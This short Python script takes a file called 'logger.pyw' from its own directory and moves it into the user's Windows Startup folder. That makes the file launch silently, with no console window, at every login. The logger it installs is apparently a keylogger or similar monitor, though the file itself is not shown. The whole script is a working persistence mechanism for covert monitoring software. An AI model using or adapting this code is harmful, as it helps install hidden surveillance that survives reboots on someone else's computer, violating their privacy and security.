import os
import shutil

path = os.path.join(os.path.expanduser('~'))
dir = os.path.dirname(os.path.abspath(__file__))
file_path = os.path.join(path, dir, "logger.pyw")
destination_path = os.path.join(os.path.expanduser('~'), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

if os.path.exists(file_path):
    shutil.move(file_path, destination_path)
    print("File 'logger.pyw' has been moved to the Startup folder.")
else:
    print("File 'logger.pyw' does not exist.")